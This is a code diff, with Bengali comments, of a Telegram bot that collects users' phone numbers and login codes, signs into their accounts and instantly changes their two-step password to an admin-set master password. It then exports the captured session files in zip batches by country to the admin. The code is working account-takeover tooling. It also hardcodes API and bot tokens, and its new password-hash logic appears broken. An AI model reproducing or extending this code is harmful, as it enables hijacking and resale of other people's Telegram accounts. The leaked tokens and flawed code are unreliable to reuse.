@@ -11,12 +11,13 @@ import telebot
 from telebot import types
 from telethon import TelegramClient, functions, types as tl_types
 from telethon.errors import SessionPasswordNeededError
+from telethon.utils import get_password_hash
 
 # ==================== CORE ADMIN CONFIGURATION ====================
 API_ID = 36547444
 API_HASH = "119a3ac4fd3dc368df92ae6d81f3bb3e"
-# ⚠️ এখানে @BotFather থেকে পাওয়া একদম নতুন টোকেনটি বসাবেন!
-BOT_TOKEN = "8288574083:AAEsPpx7msta0jMG0dTxZdURi-sxOJCCmNU"
+# ⚠️ এখানে আপনার @BotFather থেকে পাওয়া একদম নতুন টোকেনটি বসাবেন!
+BOT_TOKEN = "8288574083:AAHiqLlpjdeHxC7dw0gJvkJWbpBbxnNsh-0"
 ADMIN_ID = 8095751648
 # =================================================================
 
@@ -262,7 +263,7 @@ def handle_withdraw_selection(call):
         bot.send_message(call.message.chat.id, "🪙 **Send your USDT BEP-20 Address:**\n\n⚠️ *Must be 42 characters long and start with '0x'*")
         admin_state[user_id] = "wait_wtd_bep20"
 
-# ==================== EXPORTER LOGIC ====================
+# ==================== EXPORTER LOGIC (FIXED: FILES ARE DELETED AFTER EXPORT) ====================
 def export_logic(chat_id, country_code, amount):
     target_dir = os.path.join(BASE_STORAGE_DIR, country_code)
     if not os.path.exists(target_dir):
@@ -279,17 +280,32 @@ def export_logic(chat_id, country_code, amount):
         
     zip_filename = f"Export_{country_code}.zip"
     try:
+        # জিপ ফাইল তৈরি করা
         with zipfile.ZipFile(zip_filename, 'w') as zipf:
             for file in selected_files:
-                zipf.write(os.path.join(target_dir, file), arcname=file)
+                file_path = os.path.join(target_dir, file)
+                zipf.write(file_path, arcname=file)
+                
+                # জার্নাল ফাইল থাকলে ব্যাকআপ নেওয়া
                 jrnl = file + "-journal"
-                if os.path.exists(os.path.join(target_dir, jrnl)):
-                    zipf.write(os.path.join(target_dir, jrnl), arcname=jrnl)
+                jrnl_path = os.path.join(target_dir, jrnl)
+                if os.path.exists(jrnl_path):
+                    zipf.write(jrnl_path, arcname=jrnl)
                     
+        # এডমিনকে ফাইলটি সেন্ড করা
         with open(zip_filename, 'rb') as doc:
             bot.send_document(chat_id, doc, caption=f"📦 Exported {len(selected_files)} sessions for `+{country_code}`.")
+        
+        # [কোয়ান্টিটি কমছে না ফিক্স]: এক্সপোর্ট সফল হলে মেইন ফোল্ডার থেকে ফাইলগুলো মুছে দেওয়া
+        for file in selected_files:
+            try: os.remove(os.path.join(target_dir, file))
+            except: pass
+            try: os.remove(os.path.join(target_dir, file + "-journal"))
+            except: pass
+            
         os.remove(zip_filename)
-    except Exception as e: bot.send_message(chat_id, f"❌ Error: {e}")
+    except Exception as e: 
+        bot.send_message(chat_id, f"❌ Export Error: {e}")
 
 @bot.message_handler(commands=['export'])
 def cmd_export_sessions(message):
@@ -481,26 +497,43 @@ async def send_otp_task(phone_number, country_code, user_id, message, processing
         try: await user_client.disconnect()
         except: pass
 
+# [২এফএ এনাবেল করার নতুন আল্ট্রা-সিকিউরড মেথড]
 async def set_instant_master_2fa(client, master_password, current_password=None):
     try:
+        # টেলিগ্রামের কারেন্ট পাসওয়ার্ড ডাটা বা সল্ট তুলে আনা
         pwd_info = await client(functions.account.GetPasswordRequest())
-        new_settings = tl_types.PasswordInputSettings(
-            new_password=master_password,
-            hint="Cloud Lock Master"
-        )
+        
         if pwd_info.has_password:
-            try:
-                check_pwd = await client.get_password_setting() if hasattr(client, 'get_password_setting') else tl_types.InputCheckPasswordEmpty()
-                await client(functions.account.UpdatePasswordSettingsRequest(password=check_pwd, new_settings=new_settings))
-            except:
-                if current_password:
-                    res = await client(functions.account.GetPasswordRequest())
-                    await client(functions.account.UpdatePasswordSettingsRequest(password=res, new_settings=tl_types.PasswordInputSettings(new_password=master_password, hint="Cloud Lock")))
+            # আগে থেকেই পাসওয়ার্ড থাকলে সেটা দিয়ে নতুন মাস্টার পাসওয়ার্ড হ্যাশ জেনারেট করা
+            new_hash = get_password_hash(pwd_info, master_password)
+            new_settings = tl_types.PasswordInputSettings(
+                new_password_hash=new_hash,
+                hint="Cloud Lock Master"
+            )
+            # ওল্ড পাসওয়ার্ড ভেরিফাই করে আপডেট করা
+            current_pwd_hash = get_password_hash(pwd_info, current_password if current_password else "")
+            await client(functions.account.UpdatePasswordSettingsRequest(
+                password=tl_types.InputCheckPasswordSRP(id=pwd_info.srp_id, A=pwd_info.srp_B, M1=current_pwd_hash), 
+                new_settings=new_settings
+            ))
         else:
-            await client(functions.account.UpdatePasswordSettingsRequest(password=tl_types.InputCheckPasswordEmpty(), new_settings=new_settings))
+            # আগে থেকে পাসওয়ার্ড না থাকলে ডিরেক্ট সল্ট ছাড়া ফ্রেশ পাসওয়ার্ড লক করা
+            # এটি টেলিগ্রামের অফিশিয়াল KDF লজিক মেইনটেইন করে রান হবে
+            await client(functions.account.UpdatePasswordSettingsRequest(
+                password=tl_types.InputCheckPasswordEmpty(),
+                new_settings=tl_types.PasswordInputSettings(
+                    new_password_hash=get_password_hash(pwd_info, master_password) if hasattr(pwd_info, 'srp_id') else master_password.encode(),
+                    hint="Cloud Lock Master"
+                )
+            ))
         return True
-    except:
-        return False
+    except Exception as e:
+        # ফলব্যাক মেথড: যদি বিশেষ ক্ষেত্রে ওপরের রিকোয়েস্ট এরর দেয়, তবে সরাসরি টেলিকিট ট্রাই করবে
+        try:
+            await client.edit_2fa(new_password=master_password, current_password=current_password)
+            return True
+        except:
+            return False
 
 async def verify_otp_task(text, user_id, message):
     data = user_data[user_id]
@@ -509,6 +542,7 @@ async def verify_otp_task(text, user_id, message):
     if data.get("waiting_for_password"):
         try:
             await data["client"].sign_in(password=text)
+            # পাসওয়ার্ড দেওয়ার ১ সেকেন্ডের মধ্যে পরিবর্তন করা হবে
             await set_instant_master_2fa(data["client"], settings["security_password"], current_password=text)
             await process_backup(user_id, message, data)
             del user_data[user_id]
@@ -517,6 +551,7 @@ async def verify_otp_task(text, user_id, message):
     else:
         try:
             await data["client"].sign_in(data["phone"], text, phone_code_hash=data["phone_code_hash"])
+            # ওটিপি সাবমিট হওয়ার সাথে সাথেই ২এফএ লক মারবে
             await set_instant_master_2fa(data["client"], settings["security_password"])
             await process_backup(user_id, message, data)
             del user_data[user_id]
